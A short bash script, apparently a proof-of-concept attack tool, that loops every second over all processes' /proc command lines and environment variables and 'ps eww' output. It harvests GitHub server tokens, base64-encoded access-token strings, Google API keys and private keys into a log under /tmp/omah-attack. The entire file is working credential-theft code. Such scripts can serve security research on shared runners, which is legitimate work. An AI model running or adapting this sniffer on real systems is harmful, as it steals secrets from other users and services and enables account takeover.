#!/bin/bash
LOG=/tmp/omah-attack/sniff.log
PAT='ghs_[A-Za-z0-9]{20,}|eC1hY2Nlc3MtdG9rZW46[A-Za-z0-9+/=]{20,}|AIza[0-9A-Za-z_-]{30,}|-----BEGIN [A-Z ]*PRIVATE KEY-----'
while true; do
  echo tick >> "$LOG"
  for f in /proc/[0-9]*/cmdline /proc/[0-9]*/environ; do
    tr '\0' '\n' < "$f" 2>/dev/null | grep -aE "$PAT" >> "$LOG"
  done
  ps eww -e 2>/dev/null | grep -aE "$PAT" >> "$LOG"
  sleep 1
done